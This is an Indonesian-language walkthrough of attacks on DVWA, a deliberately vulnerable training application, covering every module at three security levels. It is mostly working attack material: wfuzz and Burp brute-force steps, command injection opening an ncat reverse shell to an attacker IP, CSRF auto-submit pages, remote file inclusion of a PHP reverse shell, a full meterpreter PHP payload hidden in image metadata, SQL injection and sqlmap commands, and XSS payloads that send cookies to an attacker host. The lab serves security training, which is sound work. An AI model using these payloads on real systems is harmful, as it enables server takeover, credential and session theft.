# DVWA Tricks
Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL yang sangat rentan. Tujuan utamanya adalah untuk menjadi bantuan bagi para profesional keamanan untuk menguji skill dan tools di lingkungan yang legal, membantu developer web lebih memahami proses mengamankan aplikasi web dan membantu siswa & guru untuk belajar tentang keamanan aplikasi web di platform yang sudah disediakan.

Informasi Download dan instalasi: https://github.com/digininja/DVWA

## Brute Force
Serangan brute-force terjadi saat penyerang menggunakan sistem coba-coba (trial and error) untuk menebak kredensial pengguna yang valid. Penyerang dapat mengotomatisasi proses penyerangan brute force dengan tool khusus sehingga penyerang dapat melakukan upaya login dalam jumlah besar dengan kecepatan tinggi.

### Security Low
- Brute force untuk menemukan password admin menggunakan tool Burp Suite. Pertama-tama bikin attack dengan tipe **Sniper** set payload hanya pada parameter password seperti pada gambar dibawah

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2026.JPG)

- Buat payload dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt` dan jalankan serangan dengan menekam tombol Start Attack

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2027.JPG)

- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2028.JPG)

- Brute force password admin menggunakan tool wfuzz
```sh
wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
``` 

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2029.JPG)

-Brute force password semua user dengan tool wfuzz
```sh
wfuzz --hs "incorrect" -c -z file,user-dvwa.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=FUZZ&password=FUZ2Z&Login=Login'
``` 

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2030.JPG)

### Security Medium
- Disini kita dapat melakukan brute force dengan cara yang sama, namun tiap request terjeda selama 2 detik sehingga proses brute force menjadi sangat lama 
```sh
wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
``` 

### Security High
- Disini kita akan melakukan bypass terhadap **user_token**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2031.JPG)

- Buat attack dengan type **Pitchfork** dan tempatkan payload pada parameter **password** dan **user_token**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2032.JPG)

- Buat payload 1 dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt`

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2033.JPG)

- Buat payload 2 dengan tipe **Recursive Grep**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2036.JPG)

- Clear semua string di **Grep - Match** lalu Add string **incorrect**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2037.JPG)

- Tekan tombol **Add** pada bagian **Grep Extract** lalu block hash token lalu pilih **Start at offset** dan **End at fixed length**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2038.JPG)

- Pada bagian **Redirections** pilih **Always**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2039.JPG)

- Pada tab **Resource pool** pilih **Create new resource pool** lalu centang **Maximum concurrent requests** dan isi 1. Jika sudah tekan tombol **Start Attack** untuk memulai penyerangan

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2040.JPG)

- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2041.JPG)

## Command Injection
Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.

### Security Low
```sh
127.0.0.1; ls
``` 
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)

```sh
127.0.0.1; whoami; hostname
```
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)

Menjalankan Reverse Shell di Server
```sh
127.0.0.1; ncat <IP_Attacker> 9999 -e /bin/bash
```

Listener
```sh
nc -lnvp 9999
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%208.JPG)


### Security Medium
```sh
127.0.0.1& ls
```
```sh
127.0.0.1& whoami& hostname
```
```sh
127.0.0.1& ncat <IP_Attacker> 9999 -e /bin/bash
```

### Security High
Di level ini kita hanya bisa mengeksekusi 1 perintah saja
```sh
127.0.0.1|ls
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)

## CSRF
Cross-site request forgery (CSRF) atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.

### Security Low
Mengganti password pengguna menjadi **test** lewat link
```sh
http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
```sh
<html>
    <body>
        <form action="http://<IP_Server>/DVWA/vulnerabilities/csrf" method="GET">
            <input type="hidden" name="password_new" value="test123" />
            <input type="hidden" name="password_conf" value="test123" />
            <input type="hidden" name="Change" value="Change" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)

### Security Medium (XSRF)
- Serangan ini akan menggabungkan 2 teknik yaitu CSRF dan XSS Stored
- Pindah ke halaman XSS (Stored) dengan **Security Low** lalu ubah maxlength pada **textarea** dari 50 menjadi 500 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2017.JPG)

- Masukkan script dibawah ini ke field **Message** lalu klik tombol **Sign Guestbook** untuk menjalankan
```sh
<img src="/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change">
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2042.JPG)

### Security High
- Serangan ini akan memanfaatkan celah keamanan file upload kemudian melakukan by pass terhadap parameter **user_token** untuk mengeksekusi CSRF
- Simpan script dibawah ini dengan format **nama_file.html**
```sh
<html>
    <body>
	   <h3>CSRF HIGH LEVEL</h3>
       <iframe id="myFrame" src="http://<IP_Server>/DVWA/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
       <script>
         function maliciousPayload() {
            console.log("start");
            var iframe = document.getElementById("myFrame");
            var doc = iframe.contentDocument  || iframe.contentWindow.document;
            var token = doc.getElementsByName("user_token")[0].value;
            const http = new XMLHttpRequest();
            const url = "http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change&user_token="+token+"#";
            http.open("GET", url);
            http.send();
            console.log("password changed");
         }
       </script>
    </body>
</html>
```
- Pindah ke halaman File Upload dengan **Security Low** dan upload file html diatas

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2043.JPG)

- Ubah ke **Security High** dan buka halaman CSRF
- Buka file HTML yang sudah diupload untuk mengubah password user menjadi **hacker** sesuai file HTML diatas
```sh
http://<IP_Server>/DVWA/hackable/uploads/<nama_file>.html
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2044.JPG)

## File Inclusion
File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyerang mengakses file sensitif di server atau memungkinkan mereka untuk menjalankan file berbahaya di server mereka.

### Security Low
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%205.JPG)

```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%206.JPG)

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)

Menjalankan file **php-reverse-shell.php** ke server
```sh
python3 -m http.server 80
```
```sh
nc -lnvp <port>
```
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=http://<IP_Attacker>/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2034.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2035.JPG)

### Security Medium
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

Menjalankan file **php-reverse-shell.php** ke server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=hthttp://tp://<IP_Attacker>/php-reverse-shell.php
```

### Security High
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```

## File Upload
File upload vulnerabilities terjadi ketika server web mengizinkan pengguna untuk mengunggah file ke sistem tanpa memvalidasi hal-hal penting seperti nama, type, konten, atau ukurannya.

- Sebelumnya melakukan uji serangan, download terlebih dahulu file PHP reverse shell di https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php kemudian ubah IP menjadi IP Komputer yang anda gunakan dan port sesuai kebutuhan

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2023.JPG)

- Buat sebuah listener untuk terhubung ke reverse shell dan pastikan port yang digunakan sama dengan port di file php reverse shell diatas
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2024.JPG)

### Security Low
- Upload file **php-reverse-shell.php** ke halaman web

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2021.JPG)

- Untuk menjalankan file **php-reverse-shell.php** di server, cukup buka url tempat file tersimpan di tab baru pada browser maka netcat berhasil terhubung
```sh
http://<IP_Server>/DVWA/hackable/uploads/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2022.JPG)

### Security Medium
- Gunakan tool Burp Suite untuk mengubah **Content-Type: application/x-php** menjadi **Content-Type: image/jpeg**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2025.JPG)

- Jalankan file **php-reverse-shell.php** seperti pada langkah sebelumnya

### Security High
- Siapkan sebuah file gambar apa pun dengan ukuran file dibawah 100 kb
- Buat file reverse shell PHP dengan tool msfvenom
```sh
msfvenom -p php/meterpreter/reverse_tcp lhost=IP_Attacker lport=nomor_port -f raw
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2045.JPG)

- Copy payload ke sebuah text editor, kemudian ganti karakter **'** menjadi **"** lalu tambahkan function **__halt_compiler();** dibagian paling akhir

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2046.JPG)

- Masukkan script reverse shell PHP ke dalam file gambar menggunakan tool exiftool
```sh
exiftool -DocumentName='<?php /**/ error_reporting(0); $ip = "IP_Attacker"; $port = nomor_port; if (($f = "stream_socket_client") && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = "stream"; } if (!$s && ($f = "fsockopen") && is_callable($f)) { $s = $f($ip, $port); $s_type = "stream"; } if (!$s && ($f = "socket_create") && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = "socket"; } if (!$s_type) { die("no socket funcs"); } if (!$s) { die("no socket"); } switch ($s_type) { case "stream": $len = fread($s, 4); break; case "socket": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a["len"]; $b = ""; while (strlen($b) < $len) { switch ($s_type) { case "stream": $b .= fread($s, $len-strlen($b)); break; case "socket": $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS["msgsock"] = $s; $GLOBALS["msgsock_type"] = $s_type; if (extension_loaded("suhosin") && ini_get("suhosin.executor.disable_eval")) { $suhosin_bypass=create_function("", $b); $suhosin_bypass(); } else { eval($b); } die(); __halt_compiler();' nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2047.JPG)

- Lakukan pengecekan pada file gambar dengan exiftool
```sh
exiftool nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2048.JPG)

- Upload file gambar tersebut ke halaman **File Upload** dengan security **High**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2049.JPG)

- Buka tool metasploit dengan perintah `msfconsole` di terminal

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2050.JPG)

- Lakukan konfigurasi dibawah untuk terhubung ke shell, dan pastikan IP dan port sama dengan konfigurasi msfvenom diatas
```sh
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.100.5
set lport 9999
run
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2051.JPG)

- Buka file gambar yang sudah terupload ke server dengan menggunakan celah keamanan **File Inclusion** dengan **Security High**
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/uploads/nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2052.JPG)

- Metasploit berhasil masuk ke dalam sistem dengan user **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2053.JPG)

## Insecure CAPTCHA
Captcha adalah fitur yang memberikan lapisan keamanan pada website untuk memastikan bahwa website diakses oleh manusia sungguhan, bukan robot dan mencegah tindakan spam. Akan tetapi konfigurasi yang buruk dapat menyebabkan akses tidak sah

- Karena DVWA berjalan secara lokal, maka gunakan key berikut ini: 
```sh
Site key: 6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI
Secret key: 6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe
```

- Copy key diatas dan paste di `DVWA/config/config.inc.php`

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2065.JPG)

- Buka halaman Insecure Captcha di DVWA

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2066.JPG)

- Isi form diatas dan gunakan tool Burpsuite untuk merekam setiap request yang terjadi

### Security Low
- Klik kanan pada request step2 lalu pilih **Send to Repeater**
- Ubah password lalu klik tombol **Send**
- Disini terlihat bahwa, kita bisa mengubah password apapun tanpa harus melewati captcha

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2067.JPG)

### Security Medium
- Lakukan hal yang sama seperti sebelumnya
- Disini terlihat bahwa, kita cukup menambahkan parameter **passed_captcha=true** untuk mengubah password apapun tanpa harus melewati captcha

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2068.JPG)

### Security High
- Lakukan hal yang sama seperti sebelumnya
- Untuk melakukan bypass pada captcha, cukup ubah **User-Agent: reCAPTCHA** dan **g-recaptcha-response=hidd3n_valu3**. User token bisa digunakan untuk lebih dari sekali tanpa harus mengubah nilai tokennya

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2069.JPG)

## SQL Injection
SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri

### Security Low
Tambahkan spasi setelah **--**
```sh
a' UNION SELECT user, password FROM users -- 
```

```sh
q' UNION SELECT user, password FROM users #
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%209.JPG)

### Security Medium
Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 or 1=1 UNION SELECT user, password FROM users#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2010.JPG)

### Security High
```sh
1' UNION SELECT user, password FROM users#
```

## SQL Injection (Blind)
Blind SQL Injection muncul ketika aplikasi rentan terhadap SQL Injection, tetapi respons HTTP-nya tidak berisi hasil kueri SQL yang relevan atau detail kesalahan basis data apa pun.

### Security Low
```sh
1' and length(database())=4#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2011.JPG)

- Menemukan database dengan tool sqlmap
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2054.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2055.JPG)

### Security Medium
- Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 and sleep(5)
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2012.JPG)

- Kembali ke halaman seperti semula, tangkap request pada halaman **SQL Injection (Blind)** dengan **Security Medium** menggunakan tool Burp Suite. Klik kanan pada kolom **Request** dan pilih **Save Item**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2056.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2057.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2058.JPG)

- Lakukan SQL Injection pada request dengan tool sqlmap
```sh
sqlmap -r nama_file_request --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2059.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2060.JPG)

### Security High
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=hash; security=high" --dbs
```

## Weak Session IDS
ID sesi yang lemah dapat memungkinkan pengguna lain dibajak sesinya. Jika ID sesi diambil dari rentang nilai yang kecil, penyerang hanya perlu menyelidiki ID sesi yang dipilih secara acak hingga menemukan kecocokan.

### Security Low
- Klik tombol **Generate** lalu klik kanan pada halaman dan pilih **Inspect**
- Generate pertama

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2070.JPG)

- Generate kedua

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2071.JPG)

- Generate ketiga

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2072.JPG)

- Disini terlihat bahwa **dvwaSession** terbentuk dari angka 1,2,3 dan seterusnya sehingga nilainya sangat mudah diprediksi

### Security Medium
- Generate pertama

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2073.JPG)

- Generate kedua

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2074.JPG)

- Generate ketiga

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2075.JPG)

- Nilai **dvwaSession** adalah 1692868183, 1692868290, 1692868433 dimana angka ini adalah **unix time**. Anda bisa mengkonversi nilai tersebut secara online untuk pembuktian

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2076.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2077.JPG)

### Security High
- Generate pertama

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2078.JPG)

- Generate kedua

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2079.JPG)

- Generate ketiga

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2080.JPG)

- Nilai **dvwaSession** adalah c81e728d9d4c2f636f067f89cc14862c, eccbc87e4b5ce2fe28308fd9f2a7baf3, a87ff679a2f3e71d9181a67b7542122c. Nilai tersebut menunjukkan sebuah hash. Anda bisa melakukan cracking di https://crackstation.net/

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2081.JPG)

## XSS (DOM)
DOM based XSS muncul ketika Javascript mengambil data dari sumber yang dapat dikontrol oleh penyerang misalnya seperti URL, yang memungkinkan penyerang mengeksekusi code JavaScript yang berbahaya dan membajak akun pengguna lain.

### Security Low
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2013.JPG)

Membuat halaman untuk menampung cookie
```sh
python3 -m http.server 80
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2014.JPG)

### Security Medium
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=alert(document.cookie)>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=window.location='http://<IP_Attacker>/?cookie='+document.cookie>
```

### Security High
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>alert(document.cookie);</script>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

## XSS (Reflected)
Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.

### Security Low
Menampilkan cookie halaman
```sh
<input onfocus=javascript:alert(document.cookie) autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2015.JPG)

Melakukan pencurian cookie
```sh
<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2016.JPG)

### Security Medium
Menampilkan cookie halaman
```sh
<scr<script>ipt>alert(document.cookie);</script>
```

Melakukan pencurian cookie
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie;</script>
```

### Security High
Menampilkan cookie halaman
```sh
<img src/onerror=alert(document.cookie)>
```

## XSS Stored
XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.

### Security Low
- Sebelum melakukan uji serangan, ubah maxlength pada **textarea** dari 50 menjadi 500 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2017.JPG)

- Masukkan script ini ke field **Message**
```sh
<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2018.JPG)

### Security Medium
- Sebelum melakukan uji serangan, ubah maxlength pada **input** dari 10 menjadi 100 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2019.JPG)

- Masukkan script ini ke field **Name**
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2020.JPG)

### Security High
- Ubah maxlength pada **input** menjadi 100 karakter seperti pada langkah sebelumnya
- Masukkan script ini ke field **Name**
```sh
<a onclick="alert(document.cookie)" style=display:block>test</a>
```

## Authorisation Bypass
Insecure direct object references (IDOR) adalah jenis kerentanan yang disebabkan oleh kesalahan penerapan kontrol akses (access control) sehingga pengguna biasa dapat mengakses fitur-fitur khusus yang hanya dimiliki oleh admin atau mengakses data milik pengguna lain

### Security Low
- Login dengan username **gordonb** dan password **abc123** kemudian akses halaman **Authorisation Bypass** dengan url sebagai berikut
```sh
http://<IP_Server>/DVWA/vulnerabilities/authbypass/
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2061.JPG)

### Security Medium
```sh
http://<IP_Server>/DVWA/vulnerabilities/authbypass/get_user_data.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2062.JPG)

### Security High
- Ulangi langkah pada level **Security Low**
- Tekan salah satu tombol Update di halaman **Authorisation Bypass** dan tangkap requestnya menggunakan tool Burp Suite. Klik kanan pada kolom request dan pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2063.JPG)

- Ubah security menjadi **high** dan klik tombol **send**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2064.JPG)

Referensi: https://portswigger.net/web-security/learning-path